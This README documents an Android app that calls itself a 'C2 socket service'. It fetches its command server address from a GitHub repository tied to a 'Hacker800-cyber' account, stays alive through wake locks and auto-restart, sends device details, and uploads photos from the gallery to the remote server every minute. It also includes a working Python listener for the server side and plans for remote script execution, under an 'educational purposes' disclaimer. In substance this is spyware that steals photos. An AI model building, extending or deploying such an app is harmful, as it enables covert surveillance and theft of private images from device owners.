# MyFirstAPK
Android C2 Socket Service with Photo Upload

## Overview
This is an advanced Android application that implements a Command and Control (C2) socket-based communication system with automatic photo capture and upload functionality, featuring robust connection management and persistent operation.

## Features
- **Dynamic Server Configuration**: Fetches server config from GitHub URL with local caching
- **Persistent Socket Connection**: Maintains reliable connection with automatic reconnection
- **Wake Lock Support**: Keeps service alive even when device is in sleep mode
- **Foreground Service**: Runs as a foreground service for maximum reliability (Android O+ compatible)
- **Network Monitoring**: Auto-reconnects when network becomes available
- **Heartbeat Mechanism**: Periodic heartbeat to keep connection alive and detect failures
- **Exponential Backoff**: Smart retry logic with exponential backoff for reconnection
- **Automatic Photo Upload**: Periodically scans and uploads photos from device gallery
- **Real-time Command Processing**: Listens for and responds to commands from the server

## Architecture

### Main Components

#### 1. MainActivity
- User interface for configuring server connection
- Controls for starting/stopping the socket service
- Camera integration for photo capture
- Displays photo preview after capture

#### 2. SocketService (Enhanced)
- **Configuration Management**:
  - Fetches server config from: `https://raw.githubusercontent.com/Hacker800-cyber/ngrok-config/main/Connect`
  - Caches config in SharedPreferences as fallback
  - Expected format: `host:port` (e.g., `192.168.1.100:8080`)

- **Connection Management**:
  - Persistent socket connection with auto-reconnect
  - Exponential backoff: starts at 2 seconds, max 60 seconds
  - Network callback for automatic reconnection on network changes
  - Proper socket configuration (KeepAlive, TcpNoDelay)

- **Service Reliability**:
  - Wake lock to prevent CPU sleep
  - Foreground service with notification
  - START_STICKY flag for automatic restart
  - Proper resource cleanup on destroy

- **Heartbeat System**:
  - Sends heartbeat every 30 seconds
  - Automatically triggers reconnect on failure
  - Helps detect broken connections

- **Supported Commands**:
  - `[PING]` / `[HEARTBEAT]` - Responds with `[PONG]`
  - `status` - Returns connection status
  - `stop` - Stops automatic photo upload
  - `restart` - Restarts automatic photo upload

#### 3. PhotosCommand
- Automatic photo scanning from device gallery
- Uploads up to 5 photos per scan (max 5MB each)
- Runs every 60 seconds
- Tracks uploaded photos to avoid duplicates
- Thread-safe implementation

#### 4. NetworkChangeReceiver
- Monitors network connectivity changes
- Registered in AndroidManifest for broadcast intents
- Works alongside NetworkCallback for comprehensive monitoring

## Permissions Required
- `INTERNET` - For socket communication
- `ACCESS_NETWORK_STATE` - To check network connectivity
- `CAMERA` - For photo capture
- `READ_EXTERNAL_STORAGE` - For accessing photos from gallery
- `WRITE_EXTERNAL_STORAGE` - For saving photos (API < 29)
- `FOREGROUND_SERVICE` - For background service operation
- `WAKE_LOCK` - To keep CPU running while service is active

## Building the Application

### Prerequisites
- Android SDK (API level 21+)
- Android Studio or Gradle build tools
- Java 8 or higher

### Build Instructions
```bash
# Using Gradle
./gradlew assembleDebug

# Output APK will be in: app/build/outputs/apk/debug/
```

## Installation
```bash
# Install on connected device or emulator
adb install app/build/outputs/apk/debug/app-debug.apk
```

## Usage

### Automatic Mode (Recommended)
The service automatically fetches server configuration from GitHub:

1. **Start Service**:
   - The service will automatically start when the app launches
   - It fetches server config from the GitHub URL
   - Falls back to cached config if URL is unavailable
   - Automatically connects and maintains connection

2. **Monitor Connection**:
   - Check logcat for connection status: `adb logcat -s SocketService`
   - Look for emoji indicators: 🚀 (start), ✅ (connected), ❌ (error), 💓 (heartbeat)

3. **Photo Upload**:
   - Photos are automatically scanned and uploaded every 60 seconds
   - Maximum 5 photos per scan, maximum 5MB per photo
   - Already uploaded photos are tracked to avoid duplicates

### Manual Mode (MainActivity)
You can also manually configure and control the service:

1. **Configure Server**:
   - Enter the server IP address (e.g., 192.168.1.100)
   - Enter the server port (e.g., 8080)

2. **Start Service**:
   - Click "Start Service" to establish connection
   - The status will update to show the service is running

3. **Capture Photo**:
   - Click "Capture and Upload Photo"
   - Grant camera permission if requested
   - Take a photo using the camera
   - Photo will be automatically uploaded if service is running

4. **Stop Service**:
   - Click "Stop Service" to disconnect

## Server Configuration

### GitHub Configuration File
The service fetches its server configuration from:
```
https://raw.githubusercontent.com/Hacker800-cyber/ngrok-config/main/Connect
```

**File Format**: Single line containing `host:port`

Example content:
```
192.168.1.100:8080
```

or for ngrok:
```
0.tcp.ngrok.io:12345
```

### Setting Up the Config File
1. Create a GitHub repository (e.g., `ngrok-config`)
2. Create a file named `Connect` in the `main` branch
3. Add a single line with your server address: `host:port`
4. The app will automatically fetch and use this configuration
5. Update the file to change server without rebuilding the APK

### Local Cache
- First successful connection caches the config
- Cached config is used as fallback if URL is unreachable
- Stored in SharedPreferences as `SocketConfig`

## Server Implementation

### Requirements
To work with this application, your server needs to:
1. Listen on the specified port
2. Accept socket connections
3. Send/receive line-based text messages (newline-delimited)
4. Handle device info and heartbeat messages

### Enhanced Server Commands
The service understands these commands:
- `[PING]` or `[HEARTBEAT]` - Server can ping client, receives `[PONG]`
- `status` - Returns `[STATUS] Connected` or `[STATUS] Disconnected`
- `stop` - Stops automatic photo upload, returns `[OK] Upload stopped`
- `restart` - Restarts automatic photo upload, returns `[OK] Upload restarted`

### Messages from Client
The client sends these messages:
- `[DEVICE] <manufacturer> <model> Android <version> API <sdk>`  - On connection
- `[HEARTBEAT]` - Every 30 seconds
- `[PHOTO_START]` - Beginning of photo upload
- `[PHOTO_NAME] <filename>` - Photo filename
- `[PHOTO_SIZE] <bytes>` - Photo size in bytes
- `[PHOTO_DATA] <info>` - Photo data notification

Example enhanced server implementation (Python):
```python
import socket
import time
from datetime import datetime

def handle_client(client_socket, addr):
    """Handle communication with connected Android client"""
    print(f"\n[{datetime.now().strftime('%H:%M:%S')}] ✅ Client connected from {addr}")
    
    try:
        while True:
            # Read line-based messages
            data = client_socket.recv(4096).decode('utf-8').strip()
            if not data:
                print(f"[{datetime.now().strftime('%H:%M:%S')}] 🔌 Client disconnected")
                break
            
            # Split multiple messages if they arrive together
            messages = data.split('\n')
            for msg in messages:
                if not msg:
                    continue
                    
                print(f"[{datetime.now().strftime('%H:%M:%S')}] 📨 Received: {msg}")
                
                # Handle different message types
                if msg.startswith('[DEVICE]'):
                    print(f"  → Device info received")
                
                elif msg == '[HEARTBEAT]':
                    print(f"  → 💓 Heartbeat received")
                    # Respond to heartbeat
                    client_socket.send(b'[PONG]\n')
                
                elif msg.startswith('[PHOTO_'):
                    print(f"  → 📸 Photo data received")
                
                elif msg == 'status':
                    # Client requested status
                    response = "[STATUS] Connected\n"
                    client_socket.send(response.encode('utf-8'))
                    print(f"  → Sent status response")
    
    except Exception as e:
        print(f"[{datetime.now().strftime('%H:%M:%S')}] ❌ Error: {e}")
    
    finally:
        client_socket.close()
        print(f"[{datetime.now().strftime('%H:%M:%S')}] Connection closed")

def main():
    port = 8080
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', port))
    server.listen(5)
    
    print(f"=" * 60)
    print(f"Enhanced MyFirstAPK Server")
    print(f"=" * 60)
    print(f"Listening on port {port}...")
    print(f"Waiting for Android client connections...")
    print(f"Press Ctrl+C to stop")
    print(f"=" * 60)
    
    try:
        while True:
            client_socket, addr = server.accept()
            handle_client(client_socket, addr)
    except KeyboardInterrupt:
        print("\n\nServer stopped by user")
    finally:
        server.close()
        print("Server closed")

if __name__ == "__main__":
    main()
```

## Future Feature Ideas

The codebase includes comments for potential enhancements:

### 1. Server-Driven Configuration
- Dynamic update of heartbeat interval
- Configurable photo upload settings (interval, max size, compression)
- Runtime configuration changes without APK rebuild

### 2. Command Registry System
- Dynamic command registration via server
- Plugin-like command architecture
- Execute custom scripts received from server

### 3. File Management
- Bi-directional file upload/download
- Support for various file types
- Batch file operations

### 4. Security Enhancements
- TLS/SSL encryption for socket traffic
- Command authentication and authorization
- Certificate pinning for server verification
- Encrypted command payloads

### 5. Advanced Logging
- Server-controlled log levels (DEBUG, INFO, ERROR)
- Remote log viewing and collection
- Performance metrics reporting

### 6. Enhanced Reconnection
- Reset attempt counter after stable connection
- Configurable backoff parameters
- Connection quality monitoring

### 7. Photo Processing
- Server-controlled photo resolution
- Automatic compression before upload
- Photo metadata extraction and reporting
- Selective photo upload based on criteria

## Security Considerations

⚠️ **WARNING**: This application is for educational purposes only.

- The application transmits data over unencrypted sockets
- No authentication mechanism is implemented by default
- Camera, storage, and internet permissions provide significant access
- Wake lock keeps device active, impacting battery life
- Should not be used in production without proper security measures

### Recommended Security Enhancements:
1. Implement TLS/SSL encryption for socket communication
2. Add authentication and authorization mechanisms
3. Validate and sanitize all incoming commands
4. Implement certificate pinning
5. Add rate limiting and input validation
6. Use secure storage for sensitive configuration
7. Implement command signing/verification
8. Add connection whitelisting

## Project Structure
```
MyFirstAPK/
├── app/
│   ├── build.gradle
│   ├── proguard-rules.pro
│   └── src/
│       └── main/
│           ├── AndroidManifest.xml
│           ├── java/com/example/myfirstapk/
│           │   ├── MainActivity.java
│           │   ├── SocketService.java          # Enhanced service
│           │   ├── commands/
│           │   │   └── PhotosCommand.java      # Auto photo upload
│           │   └── receivers/
│           │       └── NetworkChangeReceiver.java
│           └── res/
│               ├── layout/
│               │   └── activity_main.xml
│               └── values/
│                   └── strings.xml
├── build.gradle
├── settings.gradle
├── test_server.py                              # Basic test server
└── README.md
```

## Technical Details

### Connection Flow
1. Service starts and acquires wake lock
2. Loads cached config from SharedPreferences
3. Attempts to fetch fresh config from GitHub URL
4. Establishes socket connection with 15-second timeout
5. Sends device information
6. Starts heartbeat mechanism
7. Begins listening for commands
8. PhotosCommand starts auto-upload
9. On connection loss: cleanup and exponential backoff retry

### Thread Management
- Main Handler: UI updates and delayed tasks
- Heartbeat Handler: Periodic heartbeat sending
- Connection Thread: Socket connection and command listening
- Photo Upload Threads: Scan and upload operations

### State Management
- AtomicBoolean for thread-safe flags
- Synchronized block for connection lock
- Proper cleanup in onDestroy()
- START_STICKY for automatic restart

## Monitoring and Debugging

### Logcat Filters
```bash
# All service logs
adb logcat -s SocketService

# All app logs
adb logcat -s SocketService PhotosCommand NetworkChangeReceiver MainActivity

# With emoji for easy scanning
adb logcat -s SocketService | grep -E "🚀|✅|❌|💓|📸|🔌"
```

### Key Log Messages
- 🚀 Service onCreate - Service starting
- ⚡ WakeLock acquired - Wake lock active
- 🔔 Foreground service started - Running in foreground
- 📦 Loaded cached config - Using stored config
- 🔌 Connecting to - Connection attempt
- ✅ Connected to server - Successfully connected
- 📱 Device info sent - Device details transmitted
- 📸 PhotosCommand started - Auto-upload active
- 💓 Heartbeat sent - Keep-alive sent
- ❌ Connection failed - Connection error
- ⏱️ Reconnecting in - Retry scheduled
- 💀 Service onDestroy - Service shutting down

## License
This project is provided as-is for educational purposes.

## Disclaimer
This software is provided for educational and research purposes only. Users are responsible for ensuring compliance with all applicable laws and regulations. The authors are not responsible for any misuse of this software. Always obtain proper authorization before monitoring or controlling devices.
